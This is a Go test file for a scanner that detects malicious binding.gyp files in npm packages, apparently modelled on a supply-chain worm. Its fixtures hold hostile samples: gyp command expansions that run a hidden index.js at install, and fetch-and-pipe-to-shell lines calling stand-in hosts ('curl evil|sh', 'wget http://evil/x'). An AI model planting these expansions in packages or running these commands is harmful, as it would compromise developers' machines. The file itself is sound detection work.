package gypscan_test

import (
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/gypscan"
)

// wormGyp is the canonical phantom-gyp / Miasma payload shape from the
// June 2026 campaign: a ~tiny binding.gyp with a type:"none" target whose
// only "source" is a command-expansion that runs index.js during configure.
const wormGyp = `{
  "targets": [{
    "target_name": "Setup",
    "type": "none",
    "sources": ["<!(node index.js >/dev/null 2>&1 && echo stub.c)"]
  }]
}`

// legitAddonGyp is a normal native-addon descriptor (node-addon-api shape).
const legitAddonGyp = `{
  "targets": [
    {
      "target_name": "my_addon",
      "type": "loadable_module",
      "sources": ["src/addon.cc", "src/util.cc"],
      "include_dirs": ["<!@(node -p \"require('node-addon-api').include\")"]
    }
  ]
}`

func TestInspectFlagsWormCommandExpansion(t *testing.T) {
	v := gypscan.Inspect(gypscan.Input{GypContent: []byte(wormGyp)})

	require.True(t, v.Flagged())
	require.Equal(t, gypscan.SeverityCritical, v.Severity)
	require.True(t, hasSignal(v, "gyp-command-in-sources"), "expected command-in-sources signal, got %v", codes(v))
	require.True(t, hasSignal(v, "gyp-payload-shell"), "expected payload-shell signal, got %v", codes(v))
	require.True(t, hasSignal(v, "gyp-type-none-target"))
	// The matched excerpt should carry the offending fragment for the report.
	for _, s := range v.Signals {
		if s.Code == "gyp-command-in-sources" {
			require.Contains(t, s.Excerpt, "node index.js")
		}
	}
}

func TestInspectFlagsPureJSPackageWithGyp(t *testing.T) {
	// No command expansion, but a pure-JS package (only .js files, no native
	// build deps) that nonetheless ships a binding.gyp — the account-takeover
	// tell. Should be medium, not critical.
	benignLookingGyp := `{ "targets": [ { "target_name": "noop", "type": "none" } ] }`
	v := gypscan.Inspect(gypscan.Input{
		GypContent:   []byte(benignLookingGyp),
		PackageJSON:  []byte(`{"name":"left-pad","version":"1.3.0","main":"index.js"}`),
		SiblingFiles: []string{"index.js", "package.json", "README.md"},
	})

	require.True(t, v.Flagged())
	require.Equal(t, gypscan.SeverityMedium, v.Severity)
	require.True(t, hasSignal(v, "gyp-without-native-code"), "got %v", codes(v))
	require.True(t, hasSignal(v, "gyp-type-none-target"))
}

func TestInspectAllowsLegitimateNativeAddon(t *testing.T) {
	v := gypscan.Inspect(gypscan.Input{
		GypContent:   []byte(legitAddonGyp),
		PackageJSON:  []byte(`{"name":"my-addon","dependencies":{"node-addon-api":"^7.0.0"}}`),
		SiblingFiles: []string{"binding.gyp", "package.json", "src/addon.cc", "src/util.cc"},
	})

	require.False(t, v.Flagged(), "legitimate addon flagged: %v", codes(v))
	require.Equal(t, gypscan.SeverityNone, v.Severity)
}

func TestInspectLegitIncludeDirExpansionIsClean(t *testing.T) {
	// The crucial false-positive guard: many legit gyps use
	// <!@(node -p "require('node-addon-api').include") in include_dirs to
	// locate headers. That is a header-path lookup, not a payload — it sits
	// outside `sources` and contains no payload-shaped shell. gypscan must
	// NOT flag it, or it will cry wolf on sharp, bcrypt, better-sqlite3, etc.
	v := gypscan.Inspect(gypscan.Input{
		GypContent:   []byte(legitAddonGyp),
		PackageJSON:  []byte(`{"name":"my-addon","dependencies":{"node-addon-api":"^7.0.0"}}`),
		SiblingFiles: []string{"binding.gyp", "src/addon.cc"},
	})
	require.False(t, v.Flagged(), "legit include_dirs expansion flagged: %v", codes(v))
	require.Equal(t, gypscan.SeverityNone, v.Severity)
}

func TestInspectIgnoresCommandExpansionInGypComment(t *testing.T) {
	gyp := `{
  # example only: <!(node x.js && echo y)
  "targets": [{
    "target_name": "addon",
    "type": "loadable_module",
    "sources": ["src/addon.cc"]
  }]
}`
	v := gypscan.Inspect(gypscan.Input{GypContent: []byte(gyp)})
	require.False(t, v.Flagged(), "comment-only payload should not flag: %v", codes(v))
	require.Equal(t, gypscan.SeverityNone, v.Severity)
}

func TestInspectCommentStrippingKeepsRealPayloadVisible(t *testing.T) {
	gyp := `{
  # comment before payload
  "targets": [{
    "target_name": "Setup",
    "type": "none",
    "sources": ["<!(node index.js >/dev/null 2>&1 && echo stub.c)"]
  }]
}`
	v := gypscan.Inspect(gypscan.Input{GypContent: []byte(gyp)})
	require.True(t, v.Flagged())
	require.Equal(t, gypscan.SeverityCritical, v.Severity)
	require.True(t, hasSignal(v, "gyp-command-in-sources"), "got %v", codes(v))
	require.True(t, hasSignal(v, "gyp-payload-shell"), "got %v", codes(v))
}

func TestInspectHashInsideQuotedStringIsNotComment(t *testing.T) {
	gyp := `{
  "targets": [{
    "target_name": "addon",
    "type": "loadable_module",
    "sources": ["./a#b/addon.cc"]
  }]
}`
	v := gypscan.Inspect(gypscan.Input{GypContent: []byte(gyp)})
	require.False(t, v.Flagged(), "quoted hash should not change classification: %v", codes(v))
	require.Equal(t, gypscan.SeverityNone, v.Severity)
}

func TestInspectPayloadShellOutsideSourcesStillFlags(t *testing.T) {
	// Relocating the expansion out of `sources` does not save the worm: a
	// payload-shaped command (chaining + interpreter + redirection) in an
	// include_dirs/condition still trips the payload-shell signal.
	relocated := `{
  "targets": [{
    "target_name": "x",
    "type": "none",
    "include_dirs": ["<!(node -e \"require('child_process').exec('curl evil|sh')\" && echo .)"]
  }]
}`
	v := gypscan.Inspect(gypscan.Input{GypContent: []byte(relocated)})
	require.True(t, v.Flagged())
	require.Equal(t, gypscan.SeverityCritical, v.Severity)
	require.True(t, hasSignal(v, "gyp-payload-shell"), "got %v", codes(v))
}

func TestInspectFlagsPayloadInIncludedContents(t *testing.T) {
	root := `{
  "includes": ["payload.gypi"],
  "targets": [{ "target_name": "Setup", "type": "none" }]
}`
	include := `{ "targets": [{ "target_name": "Setup", "sources": ["<!(node evil.js && echo stub.c)"] }] }`

	v := gypscan.Inspect(gypscan.Input{
		GypContent:       []byte(root),
		IncludedContents: [][]byte{[]byte(include)},
	})

	require.True(t, v.Flagged())
	require.Equal(t, gypscan.SeverityCritical, v.Severity)
	require.True(t, hasSignal(v, "gyp-command-in-sources"), "got %v", codes(v))
	for _, s := range v.Signals {
		if s.Code == "gyp-command-in-sources" {
			require.Contains(t, s.Detail, "included GYP file")
			require.Contains(t, s.Excerpt, "node evil.js")
		}
	}
}

func TestInspectCleanIncludedContentsAreClean(t *testing.T) {
	v := gypscan.Inspect(gypscan.Input{
		GypContent:       []byte(legitAddonGyp),
		IncludedContents: [][]byte{[]byte(`{ "variables": { "openssl_fips": "" } }`)},
		PackageJSON:      []byte(`{"name":"my-addon","dependencies":{"node-addon-api":"^7.0.0"}}`),
		SiblingFiles:     []string{"binding.gyp", "src/addon.cc"},
	})

	require.False(t, v.Flagged(), "clean included content flagged: %v", codes(v))
	require.Equal(t, gypscan.SeverityNone, v.Severity)
}

func TestInspectLegitRootWithBenignCommonIncludeIsClean(t *testing.T) {
	root := `{
  "includes": ["deps/common.gypi"],
  "targets": [{
    "target_name": "better_sqlite3",
    "type": "loadable_module",
    "sources": ["src/better_sqlite3.cpp"],
    "include_dirs": ["<!@(node -p \"require('node-addon-api').include\")"]
  }]
}`

	v := gypscan.Inspect(gypscan.Input{
		GypContent:       []byte(root),
		IncludedContents: [][]byte{[]byte(`{ "variables": { "sqlite": "bundled" } }`)},
		PackageJSON:      []byte(`{"name":"better-sqlite3","dependencies":{"node-addon-api":"^7.0.0"}}`),
		SiblingFiles:     []string{"binding.gyp", "src/better_sqlite3.cpp"},
	})

	require.False(t, v.Flagged(), "benign common.gypi include flagged: %v", codes(v))
	require.Equal(t, gypscan.SeverityNone, v.Severity)
}

func TestInspectEmptyContentIsClean(t *testing.T) {
	for _, content := range [][]byte{nil, []byte(""), []byte("   \n\t  ")} {
		v := gypscan.Inspect(gypscan.Input{GypContent: content})
		require.False(t, v.Flagged())
		require.Equal(t, gypscan.SeverityNone, v.Severity)
		require.Empty(t, v.Signals)
	}
}

func TestInspectBareGypNoEvidenceDoesNotAssertPureJS(t *testing.T) {
	// With only the gyp (no package.json, no file listing) and no command
	// expansion, gypscan must NOT fire the pure-JS signal — it cannot prove
	// the package lacks native code. A type:none target alone is still medium.
	v := gypscan.Inspect(gypscan.Input{
		GypContent: []byte(`{ "targets": [ { "target_name": "x", "type": "none" } ] }`),
	})
	require.False(t, hasSignal(v, "gyp-without-native-code"))
	require.True(t, hasSignal(v, "gyp-type-none-target"))
	require.Equal(t, gypscan.SeverityMedium, v.Severity)

	// A real-addon-shaped gyp with no evidence is fully clean.
	clean := gypscan.Inspect(gypscan.Input{
		GypContent: []byte(`{ "targets": [ { "target_name": "x", "type": "static_library", "sources": ["a.c"] } ] }`),
	})
	require.False(t, clean.Flagged())
}

func TestInspectShellMetacharVariants(t *testing.T) {
	cases := []struct {
		name string
		gyp  string
	}{
		{"dollar-paren", `{ "targets": [ { "sources": ["<!($(curl evil.sh | sh))"] } ] }`},
		{"backtick", "{ \"targets\": [ { \"sources\": [\"<!(`wget http://evil/x`)\"] } ] }"},
		{"chained", `{ "targets": [ { "sources": ["<!(x && bash payload.sh)"] } ] }`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			v := gypscan.Inspect(gypscan.Input{GypContent: []byte(tc.gyp)})
			require.True(t, v.Flagged(), "expected flag for %s", tc.name)
			require.Equal(t, gypscan.SeverityCritical, v.Severity)
		})
	}
}

func TestInspectPackageWithNativeDepNotFlaggedAsPureJS(t *testing.T) {
	// gypfile:true legitimizes a binding.gyp even without visible .cc files
	// in the (partial) listing the caller supplied.
	v := gypscan.Inspect(gypscan.Input{
		GypContent:   []byte(`{ "targets": [ { "target_name": "x", "type": "none" } ] }`),
		PackageJSON:  []byte(`{"name":"x","gypfile":true}`),
		SiblingFiles: []string{"index.js"},
	})
	require.False(t, hasSignal(v, "gyp-without-native-code"), "gypfile:true should suppress pure-JS signal")
}

func hasSignal(v gypscan.Verdict, code string) bool {
	for _, s := range v.Signals {
		if s.Code == code {
			return true
		}
	}
	return false
}

func codes(v gypscan.Verdict) []string {
	out := make([]string, 0, len(v.Signals))
	for _, s := range v.Signals {
		out = append(out, s.Code)
	}
	return out
}
